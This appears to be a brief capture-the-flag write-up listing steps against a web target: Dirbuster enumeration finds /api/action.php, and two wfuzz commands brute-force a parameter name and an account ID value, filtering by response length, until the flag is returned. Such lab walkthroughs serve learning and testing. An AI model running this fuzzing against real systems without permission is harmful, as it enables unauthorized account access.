



## Ran Dirbuster against url

## Found api dir

## Found api/action.php

## HTTP GET on /api/action.php	

## -> Response Error: Parameter not set -> Content Length 24

## wfuzz --hh=24 -c -w  /big.txt url -> /api/action.php?FUZZ=placebo

## Parameter "reset" gets a hit

## /api/action.php?reset=placebo

## -> Response Error: Account ID not found -> Content Length 27

## wfuzz --hh=27 -c -w /common.txt url -> /api/action.php?reset=FUZZ

## Value "20" gets a hit

## HTTP GET on /api/action.php?reset=20 gives the flag